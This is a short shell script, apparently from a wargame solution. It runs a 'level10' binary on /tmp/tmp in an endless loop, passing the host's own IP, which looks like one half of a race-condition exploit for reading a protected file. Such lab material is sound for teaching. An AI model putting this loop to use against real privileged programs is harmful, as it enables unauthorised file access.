IP=$(ifconfig | grep 'inet ' | awk 'NR==1 {print $2}' | cut -d ":" -f2)
while true; do  
  #/home/user/level10/level10 /tmp/tmp ${IP} >/dev/null
  /home/user/level10/level10 /tmp/tmp $(hostname -I | awk '{print $1}') >/dev/null
done
